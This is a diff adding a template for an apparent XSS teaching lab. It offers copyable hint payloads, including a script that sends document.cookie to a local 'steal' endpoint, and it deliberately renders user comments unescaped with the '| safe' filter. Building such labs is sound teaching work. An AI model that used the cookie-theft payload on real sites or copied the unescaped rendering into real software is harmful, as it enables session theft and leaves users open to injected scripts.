@@ -1,0 +1,44 @@
+{% extends "base.html" %}
+
+{% block content %}
+    <h2>XSS (Cross-Site Scripting) Demo</h2>
+    
+    <div class="alert info">
+        <p><strong>Goal:</strong> Inject JavaScript to trigger a popup alert.</p>
+        <p><strong>Hint:</strong> Try typing <code id="xss-hint">&lt;script&gt;alert('do not do this')&lt;/script&gt;</code> 
+        <button type="button" onclick="navigator.clipboard.writeText(document.getElementById('xss-hint').textContent)" style="margin-left: 0.5rem; padding: 0.25rem 0.5rem; font-size: 0.9rem;">Copy</button></p>
+    </div>
+
+        <div class="alert info">
+        <p><strong>Goal:</strong> Inject JavaScript leak data to other site.</p>
+        <p><strong>Hint:</strong> Try typing <code id="xss-hint1">&lt;script&gt;new Image().src = "http://127.0.0.1:8000/steal?cookie=" + document.cookie;&lt;/script&gt;</code> 
+        <button type="button" onclick="navigator.clipboard.writeText(document.getElementById('xss-hint1').textContent)" style="margin-left: 0.5rem; padding: 0.25rem 0.5rem; font-size: 0.9rem;">Copy</button></p>
+    </div>
+
+
+        <div class="alert info">
+        <p><strong>Goal:</strong> Inject JavaScript by  error trap.</p>
+        <p><strong>Hint:</strong> Try typing <code id="xss-hint2">img src="x" onerror="alert('do not do this')"</code> 
+        <button type="button" onclick="navigator.clipboard.writeText(document.getElementById('xss-hint2').textContent)" style="margin-left: 0.5rem; padding: 0.25rem 0.5rem; font-size: 0.9rem;">Copy</button></p>
+    </div>
+
+
+    <form method="POST">
+        <label for="comment">Leave a public comment:</label>
+        <input type="text" id="comment" name="comment" placeholder="Enter your comment here..." required>
+        <button type="submit">Post Comment</button>
+    </form>
+
+    <hr>
+
+    <h3>Recent Comments:</h3>
+    {% if user_input %}
+        <div style="border: 1px dashed red; padding: 1rem; background: #fff0f0;">
+            <p><strong>User says:</strong></p>
+            
+            {{ user_input | safe }}
+            
+        </div>
+    {% endif %}
+
+{% endblock %}
